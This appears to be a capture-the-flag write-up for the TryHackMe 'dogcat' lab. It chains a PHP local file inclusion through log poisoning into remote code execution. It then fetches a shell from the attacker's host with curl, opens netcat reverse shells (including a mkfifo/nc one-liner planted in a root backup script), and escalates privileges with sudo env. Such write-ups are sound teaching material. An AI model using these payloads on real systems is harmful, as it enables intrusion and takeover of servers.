@@ -1,0 +1,96 @@
+Writeup for [dogcat](https://tryhackme.com/r/room/dogcat)
+
+### Recon
+```
+1. Inspect the code
+<a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
+2. Notice ?view=dog and ?view=cat, can using php wrapper
+Using wrapper payloads from [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#wrapper-phpfilter)
+`?view=php://filter/convert.base64-encode/resource={resource}`
+
+And after a while, we got a hint at
+`?view=php://filter/convert.base64-encode/resource=dog`
+give as `PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K` which is base64 encoded
+`<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />` which is directory somewhere on the system.
+
+Next try
+`?view=php://filter/convert.base64-encode/resource=dog/../index` and we got a code of index
+
+Now we can see that code has vulnerabilities: 
+`if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat'))` with ($_GET['view']) alow us using LFI or Path Traversal attacks vectors. If input is not properly sanitized or validated. An attacker could potentially execute arbitrary PHP code by manipulating the view parameter.
+So if our user input contain «dog» or «cat», and ext is None we can see local files
+`/?view=cat/../../../../../../etc/passwd&ext=` > we got access
+`view-source:http://10.10.94.191/?view=cat/../../../../../../var/log/apache2/access.log&ext=` give us a new vector to RCE 
+```
+
+### First flag
+```
+view-source:http://10.10.71.22/?view=cat/../../../../../../var/log/apache2/access.log&ext&c=ls
+view-source:http://10.10.71.22/?view=cat/../../../../../../var/log/apache2/access.log&ext&c=cat%20flag.php
+```
+
+### LFI to RCE
+via log file with UserAgent HTTP header
+```
+curl "http://10.10.71.22/" -H "User-Agent: <?php system(\$_GET['command']); ?>"
+Give us at log <b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/log/apache2/access.log</b> on line <b>9</b><br />
+Expoit ?view=cat/../../../../../../var/log/apache2/access.log&ext&c=id
+Run my python web server with reverse shell
+Run netcat listener for shell
+Expoit ?view=cat/../../../../../../var/log/apache2/access.log&ext&c=curl%20http://10.21.20.84:8000/shell.php%20%3E%20shell.php
+Execute rev.shell http://[ip]/shell.php
+
+$ nc -nlvp 8888
+listening on [any] 8888 ...
+connect to [---] from (UNKNOWN) [---] 38834
+Linux 891d7c7ad916 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
+19:16:53 up 43 min,  0 users,  load average: 0.00, 0.00, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+### Second flag
+```
+$ cd /var/www/html
+$ cd ..
+$ ls
+flag2_QMW7JvaY2LvK.txt
+$ cat flag*
+```
+
+### Third flag
+```
+$ sudo -l
+<<< (root) NOPASSWD: /usr/bin/env
+Go to GTFOBIN https://gtfobins.github.io/gtfobins/env/
+Exploit sudo env /bin/sh
+$ sudo env /bin/bash
+# whoami
+<<< root
+# cd /root
+# ls
+<<< flag3.txt
+# cat flag*
+```
+
+### Forth flag
+```
+Find .dockerenv in root directory
+Find /opt/backups/backup.sh with root priv change it to 
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 9000 >/tmp/
+
+Run new netcat listener
+$ nc -lnvp 9000             
+listening on [any] 9000 ...
+connect to [---] from (UNKNOWN) [---] 35356
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# ls
+container
+flag4.txt
+# cat flag*
+```
